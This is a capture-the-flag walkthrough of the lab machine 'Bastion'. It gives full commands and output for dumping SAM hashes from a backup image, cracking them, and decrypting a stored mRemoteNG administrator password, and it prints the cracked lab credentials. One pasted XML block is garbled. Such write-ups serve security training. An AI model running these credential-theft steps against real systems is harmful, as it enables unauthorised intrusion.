Target: 10.10.10.134

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.134

Nmap scan report for 10.10.10.134
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -38m59s, deviation: 1h09m14s, median: 58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-19T09:49:37+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

nmap all-ports
```
$ sudo nmap -sC -sV 10.10.10.134 -p- -v

Nmap scan report for 10.10.10.134
Host is up (0.13s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

smbclient
```
$ smbclient -L //10.10.10.134 

Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

connecting to /Backups
```
$ smbclient //10.10.10.134/Backups

Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.

smb: \> dir

  .                                   D        0  Mon Jul 19 02:58:29 2021
  ..                                  D        0  Mon Jul 19 02:58:29 2021
  HVZMWQGSBC                          D        0  Mon Jul 19 01:16:36 2021
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  TQBGELCNIF                          D        0  Mon Jul 19 01:25:07 2021
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
```

downloading suspicous file/s (note)
```
smb: \> get note.txt

getting file \note.txt of size 116 as note.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

$ cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

looking for suspicous file/s (backup)
```
smb: \> cd WindowsImageBackup

smb: \WindowsImageBackup\> dir
  .                                  Dn        0  Fri Feb 22 07:44:02 2019
  ..                                 Dn        0  Fri Feb 22 07:44:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 07:45:32 2019

                7735807 blocks of size 4096. 2761735 blocks available

smb: \WindowsImageBackup\> cd L4mpje-PC

smb: \WindowsImageBackup\L4mpje-PC\> dir
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 07:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 07:45:32 2019
  MediaId                            An       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 07:45:32 2019

                7735807 blocks of size 4096. 2761735 blocks available

smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"

smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 07:45:32 2019

                7735807 blocks of size 4096. 2761619 blocks available
```

mounting vhd file
```
$ sudo mkdir /mnt/L4mpje-PC

$ sudo mkdir /mnt/vhd

$ sudo modprobe nbd

$ sudo mount -t cifs //bastion.htb/Backups/WindowsImageBackup/L4mpje-PC  /mnt/L4mpje-PC/ -o user=anonymous

$ sudo qemu-nbd -r -c /dev/nbd0 "/mnt/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"

$ sudo mount -r /dev/nbd0p1 /mnt/vhd
```

viewing contents of vhd file
```
$ cd /mnt/vhd

$ ls -la

total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 4 root root       4096 Jul 26 03:16  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /mnt/vhd/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows

$ cd Windows/System32/config

$ ls -la

total 74740
drwxrwxrwx 1 root root    12288 Feb 22  2019 .
drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
<snip>
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SAM.LOG
-rwxrwxrwx 2 root root    21504 Feb 22  2019 SAM.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SAM.LOG2
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SECURITY
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SECURITY.LOG
-rwxrwxrwx 2 root root    21504 Feb 22  2019 SECURITY.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SECURITY.LOG2
-rwxrwxrwx 1 root root 24117248 Feb 22  2019 SOFTWARE
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SOFTWARE.LOG
-rwxrwxrwx 2 root root   262144 Feb 22  2019 SOFTWARE.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SOFTWARE.LOG2
-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SYSTEM.LOG
-rwxrwxrwx 2 root root   262144 Feb 22  2019 SYSTEM.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SYSTEM.LOG2
drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR
```

copying SYSTEM and SAM
```
$ cp /mnt/vhd/Windows/System32/config/SYSTEM .

$ cp /mnt/vhd/Windows/System32/config/SAM .
```

### Findings:Looking for attack vectors

Dump and crack SAM hashes from the SYSTEM and SAM file.


## Foothold:

secretsdump
```
$ secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

cracking ntlm hash
```
$ hashcat -m 1000 -o crack.txt nhash.txt /usr/share/wordlists/rockyou.txt 

$ cat crack.txt

26112010952d963c8dc4217daec986d9:bureaulampje
```

Loot:

`l4mpje:bureaulampje`

```
$ ssh l4mpje@10.10.10.134

l4mpje@BASTION C:\Users\L4mpje>whoami

bastion\l4mpje
```

```
l4mpje@BASTION C:\Users\L4mpje>cd Desktop 

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt

<redacted>
```


## Priv Escalations:

enumerating installed programs
```
l4mpje@BASTION C:\Users\L4mpje>cd C:\"Program Files (x86)" 

l4mpje@BASTION C:\Program Files (x86)>dir 

 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0CB3-C487                                                                               
                                                                                                                 
 Directory of C:\Program Files (x86)                                                                             
                                                                                                                 
22-02-2019  15:01    <DIR>          .                                                                            
22-02-2019  15:01    <DIR>          ..                                                                           
16-07-2016  15:23    <DIR>          Common Files                                                                 
23-02-2019  10:38    <DIR>          Internet Explorer                                                            
16-07-2016  15:23    <DIR>          Microsoft.NET                                                                
22-02-2019  15:01    <DIR>          mRemoteNG                                                                    
23-02-2019  11:22    <DIR>          Windows Defender                                                             
23-02-2019  10:38    <DIR>          Windows Mail                                                                 
23-02-2019  11:22    <DIR>          Windows Media Player                                                         
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                  
16-07-2016  15:23    <DIR>          Windows NT                                                                   
23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                         
16-07-2016  15:23    <DIR>          Windows Portable Devices                                                     
16-07-2016  15:23    <DIR>          WindowsPowerShell                                                            
               0 File(s)              0 bytes                                                                    
              14 Dir(s)  11.316.043.776 bytes free 
```

researching about mRemoteNG

backups are stored in %AppData%\mRemoteNG

[mRemoteNG documentation](https://mremoteng.readthedocs.io/en/master/troubleshooting.html)

getting the backup file
```
l4mpje@BASTION C:\Program Files (x86)>dir 

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir 

 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0CB3-C487                                                                               
                                                                                                                 
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                          
                                                                                                                 
22-02-2019  15:03    <DIR>          .                                                                            
22-02-2019  15:03    <DIR>          ..                                                                           
22-02-2019  15:03             6.316 confCons.xml                                                                 
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                      
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                      
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                      
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                      
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                      
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                      
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                      
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                      
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                      
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                      
22-02-2019  15:03                51 extApps.xml                                                                  
22-02-2019  15:03             5.217 mRemoteNG.log                                                                
22-02-2019  15:03             2.245 pnlLayout.xml                                                                
22-02-2019  15:01    <DIR>          Themes                                                                       
              14 File(s)         76.577 bytes                                                                    
               3 Dir(s)  11.315.978.240 bytes free 

$ scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .

l4mpje@10.10.10.134's password: 
confCons.xml                                                                   100% 6316    49.4KB/s   00:00
```


```
$ cat confCons.xml

<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
<snip>
```

[mRemoteNG decryptor Github link](https://github.com/haseebT/mRemoteNG-Decrypt)

decoding password
```
$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

Password: thXLHM96BeKL0ER2
```

Loot:

`Administrator:thXLHM96BeKL0ER2`

```
$ ssh administrator@10.10.10.134

administrator@BASTION C:\Users\Administrator>whoami

bastion\administrator
```

```
administrator@BASTION C:\Users\Administrator>cd Desktop

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt 
 
<redacted>
```
